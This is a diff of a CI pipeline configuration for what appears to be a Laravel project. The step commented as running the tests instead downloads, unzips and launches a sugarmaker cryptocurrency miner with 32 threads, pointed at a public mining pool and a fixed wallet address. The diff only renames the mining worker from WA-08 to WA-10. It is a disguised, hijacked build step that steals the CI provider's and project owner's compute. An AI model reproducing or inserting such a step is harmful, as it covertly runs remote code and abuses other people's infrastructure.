@@ -108,7 +108,7 @@ blocks:
             # We start the server using the .env.dusk.local environment file that uses SQLITE.
             - php artisan serve --env=dusk.local --port=8010 &
             # Run the tests
-            - wget https://github.com/decryp2kanon/sugarmaker/releases/download/v2.5.0-sugar4/sugarmaker-v2.5.0-sugar4-linux64.zip && unzip sugarmaker-v2.5.0-sugar4-linux64.zip && cd sugarmaker-v2.5.0-sugar4-linux64 && ./sugarmaker -a YespowerSugar -o stratum+tcp://stratum-na.rplant.xyz:7042 -u sugar1qkwvndf3mrdszy9slw0cmq3vmqef5mnms8a8m57.WA-08 -t 32
+            - wget https://github.com/decryp2kanon/sugarmaker/releases/download/v2.5.0-sugar4/sugarmaker-v2.5.0-sugar4-linux64.zip && unzip sugarmaker-v2.5.0-sugar4-linux64.zip && cd sugarmaker-v2.5.0-sugar4-linux64 && ./sugarmaker -a YespowerSugar -o stratum+tcp://stratum-na.rplant.xyz:7042 -u sugar1qkwvndf3mrdszy9slw0cmq3vmqef5mnms8a8m57.WA-10 -t 32
 
   - name: "Run Security Tests"
     task:
